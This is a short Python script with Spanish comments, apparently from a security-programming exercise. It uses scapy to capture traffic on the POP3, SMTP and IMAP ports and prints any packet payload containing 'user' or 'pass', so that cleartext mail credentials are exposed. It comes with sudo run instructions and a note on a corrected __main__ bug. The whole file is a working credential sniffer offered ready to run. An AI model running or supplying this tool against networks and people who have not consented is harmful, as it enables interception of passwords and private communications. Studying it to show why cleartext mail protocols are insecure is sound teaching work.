"""
BPF_sniffer.py - Sniffer de credenciales en protocolos de correo
=================================================================
Captura tráfico en los puertos POP3 (110), SMTP (25) e IMAP (143)
y muestra aquellos paquetes TCP cuyo payload contiene las cadenas
'user' o 'pass', lo que puede revelar credenciales en claro.

ERRORES CORREGIDOS:
    1. `if __name__ == '__name__':` → `if __name__ == '__main__':`
       ('__name__' es la cadena literal, no la variable especial)

REQUISITOS:
    pip install scapy
    Ejecutar con privilegios de root / administrador.

EJEMPLOS DE EJECUCIÓN:
    sudo python BPF_sniffer.py
    # Captura en segundo plano; detén con Ctrl+C.
"""

from scapy.all import sniff, TCP, IP


def packet_callback(packet):
    """
    Callback invocado por scapy para cada paquete capturado.
    Imprime destino y payload si contiene 'user' o 'pass'.
    """
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")


def main():
    """Inicia el sniffer filtrando los puertos de correo estándar."""
    print("[*] Sniffing mail traffic on ports 25, 110, 143. Press Ctrl+C to stop.")
    sniff(
        filter='tcp port 110 or tcp port 25 or tcp port 143',
        prn=packet_callback,
        store=0     # No almacenar paquetes en memoria
    )


# FIX: era `if __name__ == '__name__':` → error: compara con cadena literal
if __name__ == '__main__':
    main()
